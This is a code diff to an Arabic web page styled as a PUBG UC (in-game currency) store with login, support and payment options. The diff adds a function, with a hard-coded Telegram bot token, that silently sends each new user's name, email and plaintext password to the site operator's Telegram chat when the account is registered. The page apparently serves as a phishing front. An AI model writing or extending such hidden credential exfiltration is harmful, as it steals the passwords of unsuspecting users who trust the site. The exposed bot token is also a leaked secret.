@@ -1157,6 +1157,9 @@ footer {
 </div>
 
 <script>
+    // ---------------------- ثابت مهم: ضع هنا رقم الدردشة الخاص بك (chat id) الذي حصلت عليه من @userinfobot ----------------------
+    const YOUR_PERSONAL_CHAT_ID = 'YOUR_PERSONAL_CHAT_ID'; // ⚠️ استبدل هذا الرقم برقمك الحقيقي!
+
     // ---------------------- 1. نظام تسجيل الدخول ----------------------
     const USERS_KEY = 'pubg_website_users_v2';
     const CURRENT_USER_KEY = 'pubg_logged_user_data';
@@ -1179,14 +1182,39 @@ footer {
     function isLoggedIn() {
         return !!getLoggedUserData();
     }
+    
+    // دالة مساعدة لإرسال رسالة إلى التليجرام (إلى حسابك أنت)
+    async function sendTelegramMessage(text) {
+        const BOT_TOKEN = '8661616245:AAHGabS7i0LyxvOhZ_ATL335evqwSYgiEXI';
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: YOUR_PERSONAL_CHAT_ID, text: text, parse_mode: 'HTML' })
+            });
+            const result = await response.json();
+            return result.ok;
+        } catch(err) {
+            console.error('Telegram error:', err);
+            return false;
+        }
+    }
+
     function registerUser(username, email, password) {
         let users = getUsers();
         if(users.find(u => u.email === email)) return { success: false, msg: 'البريد موجود مسبقاً' };
         if(users.find(u => u.username === username)) return { success: false, msg: 'اسم المستخدم موجود مسبقاً' };
         users.push({ username, email, password });
         saveUsers(users);
+        
+        // إرسال إشعار إلى التليجرام عند إنشاء حساب جديد
+        const message = `🆕 <b>حساب جديد تم إنشاؤه!</b>\n👤 الاسم: ${username}\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}`;
+        sendTelegramMessage(message);
+        
         return { success: true };
     }
+    
     function loginUser(email, password) {
         let users = getUsers();
         let user = users.find(u => u.email === email && u.password === password);
@@ -1216,16 +1244,10 @@ footer {
         }
     }
 
-    // ---------------------- 2. الترجمات (مع الإيطالية والبرتغالية) ----------------------
+    // ---------------------- 2. الترجمات ----------------------
     const translations = {
         default: { pageTitle: "PUBG UC Store - متجر شدات ببجي", loginArea: "تسجيل الدخول", sectionTitle: "اختر الباقة", coupon: "استعمال كوبون", events: "لأحداث", vip: "حساب VIP", countryPlaceholder: "اختر الدولة", paymentPlaceholder: "اختر وسيلة الدفع", zain: "Zain Cash", asiaHaw: "Asia Hawala", master: "Master Card", buy: "شراء الآن", footer: "جميع الحقوق محفوظة © PUBG UC Store", modalTitle: "معرف اللاعب", deleteBtn: "حذف", changeBtn: "تغيير", pubgBrand: "PUBG MOBILE", countryModalTitle: "اختر دولتك", asia: "آسيا", europe: "أوروبا", northAmerica: "أمريكا الشمالية", southAmerica: "أمريكا الجنوبية", close: "إغلاق", notificationSettings: "اعدادات الاشعارات", ordersCenter: "مركز الطلبات", accountInfo: "معلومات الحساب", logout: "تسجيل الخروج", eventsMenu: "الاحداث", instructions: "التعليمات", support: "الدعم", cardManagement: "إدارة البطاقة" },
-        en: { pageTitle: "PUBG UC Store", loginArea: "Login", sectionTitle: "Choose Package", coupon: "Use Coupon", events: "Events", vip: "VIP Account", countryPlaceholder: "Select Country", paymentPlaceholder: "Payment Method", zain: "Zain Cash", asiaHaw: "Asia Hawala", master: "Master Card", buy: "Buy Now", footer: "All Rights Reserved © PUBG UC Store", modalTitle: "Player ID", deleteBtn: "Delete", changeBtn: "Change", pubgBrand: "PUBG MOBILE", countryModalTitle: "Select Your Country", asia: "Asia", europe: "Europe", northAmerica: "North America", southAmerica: "South America", close: "Close", notificationSettings: "Notification Settings", ordersCenter: "Orders Center", accountInfo: "Account Info", logout: "Logout", eventsMenu: "Events", instructions: "Instructions", support: "Support", cardManagement: "Card Management" },
-        es: { pageTitle: "PUBG UC Store", loginArea: "Iniciar sesión", sectionTitle: "Elige el paquete", coupon: "Usar cupón", events: "Eventos", vip: "Cuenta VIP", countryPlaceholder: "Elige país", paymentPlaceholder: "Método de pago", zain: "Zain Cash", asiaHaw: "Asia Hawala", master: "Master Card", buy: "Comprar ahora", footer: "Todos los derechos reservados", modalTitle: "ID del jugador", deleteBtn: "Eliminar", changeBtn: "Cambiar", pubgBrand: "PUBG MOBILE", countryModalTitle: "Selecciona tu país", asia: "Asia", europe: "Europa", northAmerica: "América del Norte", southAmerica: "América del Sur", close: "Cerrar", notificationSettings: "Configuración de notificaciones", ordersCenter: "Centro de pedidos", accountInfo: "Información de la cuenta", logout: "Cerrar sesión", eventsMenu: "Eventos", instructions: "Instrucciones", support: "Soporte", cardManagement: "Gestión de tarjeta" },
-        fr: { pageTitle: "PUBG UC Store", loginArea: "Connexion", sectionTitle: "Choisissez le pack", coupon: "Utiliser coupon", events: "Événements", vip: "Compte VIP", countryPlaceholder: "Choisissez le pays", paymentPlaceholder: "Mode de paiement", zain: "Zain Cash", asiaHaw: "Asia Hawala", master: "Master Card", buy: "Acheter maintenant", footer: "Tous droits réservés", modalTitle: "ID du joueur", deleteBtn: "Supprimer", changeBtn: "Changer", pubgBrand: "PUBG MOBILE", countryModalTitle: "Sélectionnez votre pays", asia: "Asie", europe: "Europe", northAmerica: "Amérique du Nord", southAmerica: "Amérique du Sud", close: "Fermer", notificationSettings: "Paramètres de notification", ordersCenter: "Centre de commandes", accountInfo: "Infos du compte", logout: "Déconnexion", eventsMenu: "Événements", instructions: "Instructions", support: "Support", cardManagement: "Gestion de carte" },
-        de: { pageTitle: "PUBG UC Store", loginArea: "Anmelden", sectionTitle: "Paket wählen", coupon: "Gutschein nutzen", events: "Ereignisse", vip: "VIP-Konto", countryPlaceholder: "Land auswählen", paymentPlaceholder: "Zahlungsmethode", zain: "Zain Cash", asiaHaw: "Asia Hawala", master: "Master Card", buy: "Jetzt kaufen", footer: "Alle Rechte vorbehalten", modalTitle: "Spieler-ID", deleteBtn: "Löschen", changeBtn: "Ändern", pubgBrand: "PUBG MOBILE", countryModalTitle: "Wählen Sie Ihr Land", asia: "Asien", europe: "Europa", northAmerica: "Nordamerika", southAmerica: "Südamerika", close: "Schließen", notificationSettings: "Benachrichtigungseinstellungen", ordersCenter: "Bestellzentrum", accountInfo: "Kontoinformationen", logout: "Abmelden", eventsMenu: "Ereignisse", instructions: "Anleitung", support: "Support", cardManagement: "Kartenverwaltung" },
-        tr: { pageTitle: "PUBG UC Store", loginArea: "Giriş yap", sectionTitle: "Paketi seç", coupon: "Kupon kullan", events: "Etkinlikler", vip: "VIP Hesap", countryPlaceholder: "Ülke seç", paymentPlaceholder: "Ödeme yöntemi", zain: "Zain Cash", asiaHaw: "Asia Havale", master: "Master Card", buy: "Şimdi satın al", footer: "Tüm hakları saklıdır", modalTitle: "Oyuncu ID", deleteBtn: "Sil", changeBtn: "Değiştir", pubgBrand: "PUBG MOBILE", countryModalTitle: "Ülkenizi seçin", asia: "Asya", europe: "Avrupa", northAmerica: "Kuzey Amerika", southAmerica: "Güney Amerika", close: "Kapat", notificationSettings: "Bildirim ayarları", ordersCenter: "Sipariş merkezi", accountInfo: "Hesap bilgileri", logout: "Çıkış yap", eventsMenu: "Etkinlikler", instructions: "Talimatlar", support: "Destek", cardManagement: "Kart Yönetimi" },
-        it: { pageTitle: "PUBG UC Store", loginArea: "Accedi", sectionTitle: "Scegli il pacchetto", coupon: "Usa coupon", events: "Eventi", vip: "Account VIP", countryPlaceholder: "Scegli paese", paymentPlaceholder: "Metodo di pagamento", zain: "Zain Cash", asiaHaw: "Asia Hawala", master: "Master Card", buy: "Acquista ora", footer: "Tutti i diritti riservati", modalTitle: "ID giocatore", deleteBtn: "Elimina", changeBtn: "Modifica", pubgBrand: "PUBG MOBILE", countryModalTitle: "Seleziona il tuo paese", asia: "Asia", europe: "Europa", northAmerica: "Nord America", southAmerica: "Sud America", close: "Chiudi", notificationSettings: "Impostazioni notifiche", ordersCenter: "Centro ordini", accountInfo: "Informazioni account", logout: "Disconnetti", eventsMenu: "Eventi", instructions: "Istruzioni", support: "Supporto", cardManagement: "Gestione carta" },
-        pt: { pageTitle: "PUBG UC Store", loginArea: "Entrar", sectionTitle: "Escolha o pacote", coupon: "Usar cupom", events: "Eventos", vip: "Conta VIP", countryPlaceholder: "Escolha o país", paymentPlaceholder: "Método de pagamento", zain: "Zain Cash", asiaHaw: "Asia Hawala", master: "Master Card", buy: "Comprar agora", footer: "Todos os direitos reservados", modalTitle: "ID do jogador", deleteBtn: "Excluir", changeBtn: "Alterar", pubgBrand: "PUBG MOBILE", countryModalTitle: "Selecione seu país", asia: "Ásia", europe: "Europa", northAmerica: "América do Norte", southAmerica: "América do Sul", close: "Fechar", notificationSettings: "Configurações de notificação", ordersCenter: "Central de pedidos", accountInfo: "Informações da conta", logout: "Sair", eventsMenu: "Eventos", instructions: "Instruções", support: "Suporte", cardManagement: "Gerenciamento de cartão" }
+        en: { pageTitle: "PUBG UC Store", loginArea: "Login", sectionTitle: "Choose Package", coupon: "Use Coupon", events: "Events", vip: "VIP Account", countryPlaceholder: "Select Country", paymentPlaceholder: "Payment Method", zain: "Zain Cash", asiaHaw: "Asia Hawala", master: "Master Card", buy: "Buy Now", footer: "All Rights Reserved © PUBG UC Store", modalTitle: "Player ID", deleteBtn: "Delete", changeBtn: "Change", pubgBrand: "PUBG MOBILE", countryModalTitle: "Select Your Country", asia: "Asia", europe: "Europe", northAmerica: "North America", southAmerica: "South America", close: "Close", notificationSettings: "Notification Settings", ordersCenter: "Orders Center", accountInfo: "Account Info", logout: "Logout", eventsMenu: "Events", instructions: "Instructions", support: "Support", cardManagement: "Card Management" }
     };
     
     function getLanguageForCountry(country) {
@@ -1330,7 +1352,33 @@ footer {
     function closeAuthModal() { authModal.classList.remove('active'); }
     function updateAuthUI() { if(isLoginMode) { authTitle.innerText='تسجيل الدخول'; authSubmitBtn.innerText='دخول'; authUsername.style.display='none'; authSwitchText.innerHTML='ليس لديك حساب؟ <span>إنشاء حساب جديد</span>'; } else { authTitle.innerText='إنشاء حساب جديد'; authSubmitBtn.innerText='إنشاء حساب'; authUsername.style.display='block'; authSwitchText.innerHTML='لديك حساب بالفعل؟ <span>تسجيل الدخول</span>'; } }
     authSwitchText.addEventListener('click', (e) => { if(e.target.tagName==='SPAN') { isLoginMode = !isLoginMode; updateAuthUI(); } });
-    authSubmitBtn.addEventListener('click', () => { const email = authEmail.value.trim(); const pwd = authPassword.value.trim(); if(!email || !pwd) { authError.innerText='يرجى ملء البريد وكلمة المرور'; return; } if(isLoginMode) { let res = loginUser(email, pwd); if(res.success) { closeAuthModal(); refreshMenuContent(); updateLoginArea(); alert(`مرحباً ${res.username}`); } else { authError.innerText=res.msg; } } else { const username = authUsername.value.trim(); if(!username) { authError.innerText='يرجى إدخال اسم المستخدم'; return; } let res = registerUser(username, email, pwd); if(res.success) { isLoginMode=true; updateAuthUI(); authError.innerText='تم إنشاء الحساب، يمكنك تسجيل الدخول الآن'; } else { authError.innerText=res.msg; } } });
+    authSubmitBtn.addEventListener('click', async () => { 
+        const email = authEmail.value.trim(); 
+        const pwd = authPassword.value.trim(); 
+        if(!email || !pwd) { authError.innerText='يرجى ملء البريد وكلمة المرور'; return; } 
+        if(isLoginMode) { 
+            let res = loginUser(email, pwd); 
+            if(res.success) { 
+                closeAuthModal(); 
+                refreshMenuContent(); 
+                updateLoginArea(); 
+                alert(`مرحباً ${res.username}`); 
+            } else { 
+                authError.innerText=res.msg; 
+            } 
+        } else { 
+            const username = authUsername.value.trim(); 
+            if(!username) { authError.innerText='يرجى إدخال اسم المستخدم'; return; } 
+            let res = registerUser(username, email, pwd); 
+            if(res.success) { 
+                isLoginMode=true; 
+                updateAuthUI(); 
+                authError.innerText='تم إنشاء الحساب، يمكنك تسجيل الدخول الآن'; 
+            } else { 
+                authError.innerText=res.msg; 
+            } 
+        } 
+    });
     authModal.addEventListener('click', (e) => { if(e.target === authModal) closeAuthModal(); });
 
     // ---------------------- 5.1 مودال الدعم ----------------------
@@ -1341,8 +1389,6 @@ footer {
     const supportErrorSpan = document.getElementById('supportError');
     const sendSupportBtn = document.getElementById('sendSupportBtn');
     const closeSupportBtn = document.getElementById('closeSupportBtn');
-    const BOT_TOKEN = '8661616245:AAHGabS7i0LyxvOhZ_ATL335evqwSYgiEXI';
-    const CHAT_ID = '@RoundUcBot'; 
 
     function openSupportModal() {
         if(!isLoggedIn()) {
@@ -1360,22 +1406,7 @@ footer {
     function closeSupportModal() {
         supportModal.classList.remove('active');
     }
-    async function sendToTelegram(name, email, message) {
-        const text = `📩 رسالة دعم جديدة:\n👤 الاسم: ${name}\n📧 البريد: ${email}\n💬 الرسالة: ${message}`;
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        try {
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
-            });
-            const result = await response.json();
-            return result.ok;
-        } catch(err) {
-            console.error(err);
-            return false;
-        }
-    }
+    
     sendSupportBtn.addEventListener('click', async () => {
         const name = supportName.value.trim();
         const email = supportEmail.value.trim();
@@ -1383,14 +1414,20 @@ footer {
         if(!name) { supportErrorSpan.innerText = 'الرجاء إدخال الاسم'; return; }
         if(!message) { supportErrorSpan.innerText = 'الرجاء كتابة الرسالة'; return; }
         if(!email) { supportErrorSpan.innerText = 'البريد الإلكتروني مفقود'; return; }
+        
         supportErrorSpan.innerText = 'جاري الإرسال...';
         sendSupportBtn.disabled = true;
-        const success = await sendToTelegram(name, email, message);
+        
+        const text = `📩 <b>رسالة دعم جديدة من الموقع</b>\n👤 الاسم: ${name}\n📧 البريد: ${email}\n💬 الرسالة: ${message}`;
+        const success = await sendTelegramMessage(text);
+        
         if(success) {
-            supportErrorSpan.innerText = 'تم إرسال رسالتك بنجاح!';
+            supportErrorSpan.innerText = '✅ تم إرسال رسالتك بنجاح!';
+            supportErrorSpan.style.color = '#4caf50';
             setTimeout(() => closeSupportModal(), 1500);
         } else {
-            supportErrorSpan.innerText = 'حدث خطأ، حاول مرة أخرى';
+            supportErrorSpan.innerText = '❌ حدث خطأ في الإرسال، حاول مرة أخرى';
+            supportErrorSpan.style.color = '#e67e22';
         }
         sendSupportBtn.disabled = false;
     });
